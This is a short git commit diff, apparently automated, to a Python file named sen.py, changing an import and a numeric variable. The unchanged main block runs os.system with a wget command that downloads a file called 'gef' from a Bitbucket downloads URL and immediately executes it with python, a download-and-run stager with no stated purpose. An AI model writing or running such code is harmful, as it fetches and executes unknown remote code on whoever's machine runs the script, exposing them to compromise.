59bb076eb6136a10a31126ab807a3ff901e2fd90
Your Name <you@example.com>
2024-10-04 09:01:29 +0200

    auto

--- sen.py
+++ sen.py
@@ -1,4 +1,4 @@
-import sys,os,asyncio
-b=5
+import sys,os,codecs
+b=11
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
